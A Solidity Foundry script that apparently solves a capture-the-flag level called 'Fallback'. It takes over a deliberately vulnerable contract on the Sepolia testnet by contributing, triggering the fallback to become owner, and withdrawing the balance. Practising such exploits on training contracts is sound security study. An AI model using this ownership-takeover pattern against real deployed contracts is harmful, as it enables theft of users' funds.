// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level1Fallback.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

// Objective:
// 1. you claim ownership of the contract
// 2. you reduce its balance to 0

contract Level1Solution is Script {
    Fallback public fb =
        Fallback(payable(0xC9F2e79e33216B78514293590B9b07F9eC3a2e35));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        fb.contribute{value: 0.0001 ether}();
        address(fb).call{value: 0.0001 ether}("");
        fb.withdraw();

        vm.stopBroadcast();
    }
}
// forge script script/Level1Solution.s.sol:Level1Solution --broadcast -vvvv --rpc-url sepolia --etherscan-api-key "${ETHERSCAN_API_KEY}"
